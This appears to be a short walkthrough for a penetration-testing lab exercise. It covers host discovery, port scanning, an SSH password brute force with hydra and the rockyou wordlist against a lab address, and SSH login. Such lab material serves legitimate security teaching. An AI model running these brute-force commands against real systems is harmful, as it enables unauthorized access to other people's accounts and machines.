# Lab 02 — SSH Brute Force
**File:** `src/laboratorios/laboratorio02.ts`
**Date:** 2026-03-31
**Difficulty:** Medium
**Category:** Network
**Network Range:** 10.10.10.0/24
**Target:** 10.10.10.11

---

## Steps

### 01 — Network Reconnaissance
Discover hosts: `arp-scan 10.10.10.0/24`

### 02 — Port Scanning
Identify services: `nmap -sV 10.10.10.11`

### 03 — Web Reconnaissance
Access the website to identify employees and possible users.

### 04 — SSH Brute Force
Get credentials: `hydra -l <username> -P /usr/share/wordlists/rockyou.txt 10.10.10.11 ssh`

### 05 — SSH Access
Connect: `ssh <username>@10.10.10.11`
